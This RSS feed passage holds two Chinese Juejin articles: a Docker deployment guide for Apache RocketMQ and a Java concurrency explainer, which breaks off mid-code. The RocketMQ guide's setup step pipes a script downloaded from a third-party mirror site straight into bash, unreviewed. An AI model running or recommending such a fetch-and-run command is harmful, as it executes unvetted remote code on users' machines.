<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Apache RocketMQ Docker 容器化部署指南]]></title>    <link>https://juejin.cn/post/7581760987763114035</link>    <guid>https://juejin.cn/post/7581760987763114035</guid>    <pubDate>2025-12-10T03:34:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581760987763114035" data-draft-id="7581765536372817929" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Apache RocketMQ Docker 容器化部署指南"/> <meta itemprop="keywords" content="RocketMQ,Docker"/> <meta itemprop="datePublished" content="2025-12-10T03:34:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员老赵"/> <meta itemprop="url" content="https://juejin.cn/user/3208848015890347"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Apache RocketMQ Docker 容器化部署指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3208848015890347/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员老赵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:34:03.000Z" title="Wed Dec 10 2025 03:34:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>Apache RocketMQ是一款分布式消息中间件，由Apache软件基金会开发维护，具有高吞吐量、低延迟、高可靠性等特点，广泛应用于分布式系统中的异步通信、流量削峰、系统解耦等场景。随着容器化技术的普及，采用Docker部署RocketMQ可以显著简化环境配置、提高部署一致性和运维效率。</p>
<p>本文将详细介绍如何通过Docker容器化方式部署Apache RocketMQ，包括环境准备、镜像拉取、容器部署、功能测试、生产环境优化及故障排查等内容，为用户提供一套完整的容器化部署方案。</p>
<h2 data-id="heading-1">环境准备</h2>
<h3 data-id="heading-2">Docker环境安装</h3>
<p>部署RocketMQ容器前，需先确保目标服务器已安装Docker环境。推荐使用以下一键安装脚本快速部署Docker及相关组件：</p>
<pre><code class="hljs language-less" lang="less">  <span class="hljs-selector-tag">bash</span> &lt;(wget -qO- <span class="hljs-attribute">https</span>:<span class="hljs-comment">//xuanyuan.cloud/docker.sh)</span>
</code></pre>
<p>执行完成后，可通过<code>docker --version</code>命令验证安装是否成功，输出类似<code>Docker version x.x.x, build xxxxxxx</code>即表示安装成功。</p>
<h2 data-id="heading-3">镜像准备</h2>
<h3 data-id="heading-4">拉取ROCKETMQ镜像</h3>
<p>使用以下命令通过轩辕镜像加速地址拉取最新版本的ROCKETMQ镜像：</p>
<pre><code class="hljs language-arduino" lang="arduino">  docker pull xxx.xuanyuan.run/apache/rocketmq:latest
</code></pre>
<p>拉取完成后，可通过以下命令验证镜像是否成功下载：</p>
<pre><code class="hljs language-bash" lang="bash">  docker images | grep apache/rocketmq
</code></pre>
<p>若输出包含<code>apache/rocketmq</code>及<code>latest</code>标签的记录，则表示镜像准备完成。</p>
<h2 data-id="heading-5">容器部署</h2>
<h3 data-id="heading-6">基础部署命令</h3>
<p>RocketMQ通常由NameServer和Broker两个核心组件构成，以下是基础的容器部署命令。</p>
<h4 data-id="heading-7">启动NameServer容器</h4>
<pre><code class="hljs language-bash" lang="bash">  docker run -d \  --name rocketmq-nameserver \  -p 9876:9876 \  -v /data/rocketmq/nameserver/logs:/root/logs \  -e <span class="hljs-string">"MAX_HEAP_SIZE=512m"</span> \  -e <span class="hljs-string">"HEAP_NEWSIZE=128m"</span> \  xxx.xuanyuan.run/apache/rocketmq:latest \  sh mqnamesrv
</code></pre>
<p><strong>参数说明</strong>：</p>
<ul>
<li>• <code>-d</code>：后台运行容器</li>
<li>• <code>--name</code>：指定容器名称为<code>rocketmq-nameserver</code></li>
<li>• <code>-p 9876:9876</code>：映射NameServer默认端口（需根据 轩辕镜像文档（ROCKETMQ） <code>https://xuanyuan.cloud/r/apache/rocketmq</code> 确认实际端口）</li>
<li>• <code>-v</code>：挂载日志目录到宿主机，实现数据持久化</li>
<li>• <code>-e</code>：设置JVM内存参数，可根据服务器配置调整</li>
</ul>
<h4 data-id="heading-8">启动Broker容器</h4>
<pre><code class="hljs language-bash" lang="bash">  docker run -d \  --name rocketmq-broker \  -p 10911:10911 \  -p 10909:10909 \  -v /data/rocketmq/broker/logs:/root/logs \  -v /data/rocketmq/broker/store:/root/store \  -e <span class="hljs-string">"NAMESRV_ADDR=nameserver-ip:9876"</span> \  -e <span class="hljs-string">"MAX_HEAP_SIZE=1024m"</span> \  -e <span class="hljs-string">"HEAP_NEWSIZE=256m"</span> \  xxx.xuanyuan.run/apache/rocketmq:latest \  sh mqbroker -c /opt/rocketmq/conf/broker.conf
</code></pre>
<p><strong>参数说明</strong>：</p>
<ul>
<li>• <code>NAMESRV_ADDR</code>：需替换为实际NameServer的IP地址和端口</li>
<li>• 端口映射：根据 轩辕镜像文档（ROCKETMQ） <code>https://xuanyuan.cloud/r/apache/rocketmq</code> 确认Broker的通信端口（如10911为默认监听端口，10909为VIP通道端口）</li>
<li>• 挂载目录：增加存储目录挂载，确保消息数据持久化</li>
</ul>
<h3 data-id="heading-9">容器状态检查</h3>
<p>部署完成后，通过以下命令检查容器运行状态：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">  # </span><span class="bash">查看所有RocketMQ相关容器docker ps --filter <span class="hljs-string">"name=rocketmq-"</span><span class="hljs-comment"># 查看容器日志（以Broker为例）docker logs -f rocketmq-broker</span></span>
</code></pre>
<p>若日志中出现<code>The broker[broker-a, xxx.xxx.xxx.xxx:10911] boot success. serializeType=JSON</code>等类似信息，则表示Broker启动成功。</p>
<h2 data-id="heading-10">功能测试</h2>
<h3 data-id="heading-11">基本连通性测试</h3>
<ol>
<li>
<p>1. <strong>进入Broker容器</strong>：</p>
<p>docker exec -it rocketmq-broker sh</p>
</li>
<li>
<p>2. <strong>设置NameServer地址</strong>：</p>
<p>export NAMESRV_ADDR=nameserver-ip:9876</p>
</li>
<li>
<p>3. <strong>发送测试消息</strong>：</p>
<p>sh tools.sh org.apache.rocketmq.example.quickstart.Producer</p>
</li>
</ol>
<p>若输出<code>SendResult [sendStatus=SEND_OK, msgId=...</code>等信息，则表示消息发送成功。</p>
<ol>
<li>
<p>4. <strong>接收测试消息</strong>：</p>
<p>sh tools.sh org.apache.rocketmq.example.quickstart.Consumer</p>
</li>
</ol>
<p>若输出<code>ConsumeMessageThread_%d Receive New Messages: [MessageExt...</code>等信息，则表示消息接收成功。</p>
<h3 data-id="heading-12">外部访问测试</h3>
<p>在宿主机或其他可访问服务器上，通过RocketMQ客户端工具连接部署的服务，验证外部网络连通性。需确保宿主机防火墙已开放相关端口（如9876、10911等）。</p>
<h2 data-id="heading-13">生产环境建议</h2>
<h3 data-id="heading-14">数据持久化</h3>
<ol>
<li>
<p>1. <strong>目录挂载</strong>：生产环境中必须挂载日志和存储目录，避免容器重启导致数据丢失：</p>
<p>-v /data/rocketmq/nameserver/logs:/root/logs -v /data/rocketmq/nameserver/store:/root/store \  # 若NameServer有持久化需求-v /data/rocketmq/broker/logs:/root/logs -v /data/rocketmq/broker/store:/root/store \</p>
</li>
<li>
<p>2. <strong>存储优化</strong>：建议使用高性能存储（如SSD）存放Broker的store目录，提升消息读写性能。</p>
</li>
</ol>
<h3 data-id="heading-15">资源配置</h3>
<ol>
<li>
<p>1. <strong>JVM参数调整</strong>：根据服务器配置合理设置JVM内存，避免OOM或资源浪费：</p>
<p>-e "MAX_HEAP_SIZE=4g" \  # 最大堆内存，建议为物理内存的50%-e "HEAP_NEWSIZE=1g" \   # 新生代内存，建议为最大堆内存的25%</p>
</li>
<li>
<p>2. <strong>容器资源限制</strong>：使用<code>--memory</code>和<code>--cpus</code>限制容器资源使用，避免资源争抢：</p>
<p>--memory=8g --cpus=4 \</p>
</li>
</ol>
<h3 data-id="heading-16">高可用配置</h3>
<ol>
<li>
<p>1. <strong>多节点部署</strong>：部署多个NameServer节点（至少3个），避免单点故障。</p>
</li>
<li>
<p>2. <strong>Broker集群</strong>：采用主从架构或Dledger模式部署Broker集群，确保消息可靠性。</p>
</li>
<li>
<p>3. <strong>网络隔离</strong>：通过Docker网络隔离不同环境（开发/测试/生产），使用自定义网络而非默认bridge网络：</p>
<p>docker network create rocketmq-networkdocker run -d --name rocketmq-nameserver --network rocketmq-network ...</p>
</li>
</ol>
<h3 data-id="heading-17">安全加固</h3>
<ol>
<li>
<p>1. <strong>容器权限</strong>：避免使用root用户运行容器，通过<code>--user</code>指定非特权用户：</p>
<p>--user 1000:1000 \</p>
</li>
<li>
<p>2. <strong>配置文件挂载</strong>：挂载自定义broker.conf配置文件，启用访问控制、TLS等安全特性：</p>
<p>-v /data/rocketmq/conf/broker.conf:/opt/rocketmq/conf/broker.conf \</p>
</li>
<li>
<p>3. <strong>日志轮转</strong>：配置宿主机日志轮转策略，避免日志文件过大占用磁盘空间。</p>
</li>
</ol>
<h2 data-id="heading-18">故障排查</h2>
<h3 data-id="heading-19">容器无法启动</h3>
<ol>
<li>
<p>1. <strong>查看启动日志</strong>：</p>
<p>docker logs --tail=100 rocketmq-broker  # 查看最近100行日志</p>
</li>
<li>
<p>2. <strong>检查端口占用</strong>：</p>
<p>netstat -tulpn | grep 9876  # 检查NameServer端口是否被占用</p>
</li>
<li>
<p>3. <strong>资源限制检查</strong>：若容器因资源不足被系统终止，可通过<code>dmesg | grep -i 'out of memory'</code>查看系统OOM日志。</p>
</li>
</ol>
<h3 data-id="heading-20">消息发送/接收失败</h3>
<ol>
<li>
<p>1. <strong>NameServer连接检查</strong>：确认Broker配置的<code>NAMESRV_ADDR</code>正确，可通过<code>telnet nameserver-ip 9876</code>测试网络连通性。</p>
</li>
<li>
<p>2. <strong>Broker状态检查</strong>：通过RocketMQ控制台或命令行工具查看Broker状态：</p>
<p>sh mqadmin clusterList -n nameserver-ip:9876</p>
</li>
<li>
<p>3. <strong>权限配置检查</strong>：若启用了ACL，检查生产者/消费者的accessKey和secretKey是否正确。</p>
</li>
</ol>
<h3 data-id="heading-21">数据一致性问题</h3>
<ol>
<li>
<p>1. <strong>存储目录权限</strong>：检查宿主机挂载目录权限是否正确，确保容器内用户有读写权限：</p>
<p>ls -ld /data/rocketmq/broker/store  # 权限应为755或容器用户可访问</p>
</li>
<li>
<p>2. <strong>磁盘空间检查</strong>：若磁盘空间不足，可能导致消息写入失败，通过<code>df -h</code>检查磁盘使用情况。</p>
</li>
</ol>
<h2 data-id="heading-22">参考资源</h2>
<ul>
<li>• 轩辕镜像文档（ROCKETMQ）<code>https://xuanyuan.cloud/r/apache/rocketmq</code></li>
<li>• ROCKETMQ镜像标签列表 <code>https://xuanyuan.cloud/r/apache/rocketmq/tags</code></li>
<li>• Docker官方文档： Docker Run Reference <code>https://docs.docker.com/engine/reference/commandline/run</code></li>
</ul>
<h2 data-id="heading-23">总结</h2>
<p>本文详细介绍了Apache RocketMQ的Docker容器化部署方案，包括环境准备、镜像拉取、容器部署、功能测试、生产环境优化及故障排查等内容，为快速搭建RocketMQ服务提供了可参考的实践指南。</p>
<p><strong>关键要点</strong>：</p>
<ul>
<li>• 使用一键脚本快速部署Docker环境，简化前期准备工作</li>
<li>• 通过轩辕镜像加速提升RocketMQ镜像下载速度，缩短部署时间</li>
<li>• 容器部署需注意核心组件（NameServer/Broker）的端口映射和数据持久化配置</li>
<li>• 生产环境中应重点关注高可用架构、资源配置优化和安全加固</li>
</ul>
<p><strong>后续建议</strong>：</p>
<ul>
<li>• 深入学习RocketMQ的集群部署模式（如Dledger主从、多副本等），提升服务可靠性</li>
<li>• 根据业务场景需求调整Broker配置参数（如消息重试策略、存储策略等）</li>
<li>• 部署RocketMQ控制台，实现可视化监控和管理</li>
<li>• 制定完善的运维方案，包括备份策略、扩容机制和故障恢复流程</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java并发核心机制深度拆解——从ConcurrentHashMap到Happens-Before]]></title>    <link>https://juejin.cn/post/7581789701531811882</link>    <guid>https://juejin.cn/post/7581789701531811882</guid>    <pubDate>2025-12-10T04:18:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581789701531811882" data-draft-id="7581702285564821554" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java并发核心机制深度拆解——从ConcurrentHashMap到Happens-Before"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-10T04:18:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="跳跳鱼"/> <meta itemprop="url" content="https://juejin.cn/user/222556523076779"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java并发核心机制深度拆解——从ConcurrentHashMap到Happens-Before
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/222556523076779/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    跳跳鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T04:18:47.000Z" title="Wed Dec 10 2025 04:18:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>第一部分：ConcurrentHashMap的演进与实现原理</strong></h2>
<p><strong>ConcurrentHashMap在JDK 1.7和1.8中有什么重要改进？</strong></p>
<p>ConcurrentHashMap在JDK 1.7到1.8版本有重大重构：</p>
<ul>
<li><strong>数据结构</strong>：由1.7的Segment数组+HashEntry改为Node数组+链表/红黑树</li>
<li><strong>同步策略</strong>：由ReentrantLock锁住整个Segment改为仅对每个桶的头部节点添加synchronized，并配合大量CAS操作</li>
<li><strong>锁粒度</strong>：减小锁竞争的概率</li>
</ul>
<p>除此之外，1.8版本还有其他优化：</p>
<ol>
<li><strong>get()操作无需加锁</strong>：因为Node节点的val和next字段被volatile修饰</li>
<li><strong>多线程扩容</strong>：提升了扩容效率</li>
<li><strong>size()方法优化</strong>：<code>size()</code>方法采用分桶计数（<code>CounterCell</code>），通过累加各部分的计数来获取总量，避免了全局锁，实现了高并发下的精确计数</li>
<li>
<ul>
<li><strong>引入红黑树</strong>：当单个桶内的元素过多时，链表查询会退化为O(n)。1.8版在特定条件下将链表转换为红黑树，将查询复杂度优化为O(log n)，有效解决了哈希冲突严重时的性能问题</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-1"><strong>第二部分：volatile与原子操作</strong></h2>
<p><strong><code>volatile</code> 保证了可见性，却无法保证操作的原子性。</strong></p>
<p>以经典的“读-改-写”场景——计数器递增 <code>i++</code> 为例，它实际上包含三个独立步骤：</p>
<ol>
<li><strong>读取</strong>当前值</li>
<li><strong>计算</strong>新值（当前值+1）</li>
<li><strong>写入</strong>新值</li>
</ol>
<p>如果 <code>i</code> 是 <code>volatile</code> 的，两个线程A和B几乎同时执行 <code>i++</code>，可能出现以下交错执行序列：</p>
<ol>
<li>线程A读取 <code>i=0</code></li>
<li>线程B读取 <code>i=0</code> （<strong>因为A还未写入，B读到了旧值</strong>）</li>
<li>线程A计算 <code>0+1=1</code> 并写入，<code>i</code> 变为 <code>1</code>（且立刻对所有线程可见）</li>
<li>线程B计算 <code>0+1=1</code> 并写入，<code>i</code> 再次变为 <code>1</code></li>
</ol>
<p>最终结果 <code>i=1</code>，而不是正确的 <code>2</code>。<strong><code>volatile</code> 保证了B在第4步能立刻看到A在第3步写入的 <code>1</code>，但无法阻止B在第2步已经读取了旧的 <code>0</code></strong>。这就是原子性缺失导致的线程安全问题。</p>
<h3 data-id="heading-2"/>
<p><strong>既然volatile不足以保证复合操作的原子性，那有哪些解决方案？</strong></p>
<p>保证原子性的核心思想是将多个操作捆绑成一个不可分割的整体，方法包括：</p>
<ol>
<li>
<p><strong>加互斥锁</strong>：使用synchronized或ReentrantLock</p>
<ul>
<li>优点：简单安全</li>
<li>缺点：性能消耗相对较大</li>
</ul>
</li>
<li>
<p><strong>Atomic原子类</strong>：如AtomicInteger进行CAS操作</p>
<ul>
<li>优点：性能通常比加锁好</li>
<li>缺点：高并发下CAS自旋可能消耗CPU，且只适用于单个变量</li>
</ul>
</li>
<li>
<p><strong>并发容器提供的原子方法</strong>：如ConcurrentHashMap的putIfAbsent</p>
<ul>
<li>优点：简单高效</li>
<li>缺点：依赖容器，不够灵活</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-3"><strong>第三部分：CAS与ABA问题</strong></h2>
<p><strong>什么是ABA问题？如何解决？</strong></p>
<p><strong>ABA问题</strong>是指在CAS操作时，一个值从A变成B又变回A，线程误以为状态没有改变。</p>
<p><strong>示例</strong>：张三借李四的钱，李四账户余额为0。张三还款后改为100，又被王五取走，账户余额归0。张三看到余额为0就判断李四没有还钱。</p>
<p><strong>解决方案</strong>：</p>
<ul>
<li>
<p><strong>添加版本号或时间戳</strong>：每次更改数值必须同步修改版本号</p>
</li>
<li>
<p><strong>JDK工具</strong>：</p>
<ul>
<li>AtomicStampedReference：提供版本号</li>
<li>AtomicMarkableReference：提供boolean值判断状态是否被修改</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-4"><strong>第四部分：JMM与Happens-Before规则</strong></h2>
<p><strong>volatile变量如何建立happens-before关系？有什么经典应用？</strong></p>
<p>volatile变量遵循两个原则：</p>
<ol>
<li><strong>写操作时</strong>：所有其他变量的修改也会一起刷新</li>
<li><strong>禁止重排序</strong>：写操作之前的操作不能重排序到写之后，读操作之后的操作不能重排序到读之前</li>
</ol>
<p><strong>经典应用：标志位开关</strong></p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
    <span class="hljs-comment">// 核心：volatile 标志位开关</span>
